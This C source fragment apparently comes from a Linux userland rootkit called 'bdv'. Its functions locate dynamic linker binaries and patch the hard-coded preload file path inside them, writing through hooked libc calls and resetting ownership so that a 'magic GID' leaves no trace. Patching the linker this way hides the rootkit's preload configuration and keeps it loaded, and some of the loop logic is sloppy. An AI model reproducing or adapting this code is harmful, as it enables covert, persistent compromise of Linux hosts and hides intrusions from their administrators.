/* overwrites, in the contents of path, whatever oldpreload contains with whatever newpreload contains.
 * if the return value is 0 then either:
 *    bindup failed. presumably because path doesn't exist.
 *    or oldpreload could not be located in path's contents.
 * if the return value is <0 something went horribly wrong. otherwise everything went ok. */
int _ldpatch(const char *path, const char *oldpreload, const char *newpreload){
    if(strlen(oldpreload) != strlen(newpreload))
        return 0;

    unsigned char *buf;
    char tmppath[strlen(path)+5];
    FILE *ofp, *nfp;
    off_t fsize;
    size_t n, m;
    mode_t ldmode;

    hook(CFOPEN, CRENAME, CCHMOD, CFWRITE);

    // bindup ignores links.
    snprintf(tmppath, sizeof(tmppath), "%s.tmp", path);
    ofp = bindup(path, tmppath, &nfp, &fsize, &ldmode);
    if(ofp == NULL) return 0;

    int count = 0, // when this is strlen(preloadpath) we have a match & have arrived at the end of the string. then we overwrite, from the beginning.
        c = 0;     // position of the curent character in the string that we're writing over the original with.

    buf = malloc(fsize+1);
    if(!buf){
        fclose(ofp);
        fclose(nfp);
        return 0;
    }
    memset(buf, 0, fsize+1);

    do{
        n = fread(buf, 1, fsize, ofp);
        if(n){
            for(int i = 0; i != fsize; i++){
                if(buf[i] == oldpreload[count]){
                    if(count == LEN_OLD_PRELOAD){ // finally.. we have arrived.
                        for(int x = i-LEN_OLD_PRELOAD; x < i; x++)
                            memcpy(&buf[x], &newpreload[c++], 1); // 18 memcpys to rule them all
                        break; // we are done here.
                    }

                    // looks like we could be getting closer...
                    count++;
                }else count=0; // reset. buf[i] is not a match.
            }
        }else m = 0;
    }while(n > 0 && n == m);

    fclose(ofp);    // cleanup & write result into the tmp file.
    call(CFWRITE, buf, 1, fsize, nfp);
    free(buf);
    fclose(nfp);

    if(count != LEN_OLD_PRELOAD){  // oldpreload was not found.
        hook(CUNLINK);             // remove tmp file & return nothing was done.
        call(CUNLINK, tmppath);
        return 0;
    }

    int chr;
    if((long)call(CRENAME, tmppath, path) != -1){
        if((long)call(CCHMOD, path, ldmode) < 0)
            return -1;
        else{
            // don't leave behind magic GID after `./bdv uninstall`
            chr = chown_path(path, 0);
            if(chr != -1)
                return 1; // success
            else
                return -1;
        }
    }else return -1;

    return -1;
}

/* returns the amount of successful patches. */
int ldpatch(const char *oldpreload, const char *newpreload){
    char **foundld;
    int allf, p, c=0;

    foundld = ldfind(&allf);
    if(foundld == NULL)
        return 0;

    for(int i=0; i<allf; i++){
        p=_ldpatch(foundld[i], oldpreload, newpreload);

        free(foundld[i]);
        foundld[i] = NULL;

        if(p<0) return p;
        if(p) c++;
    }

    free(foundld);
    return c;
}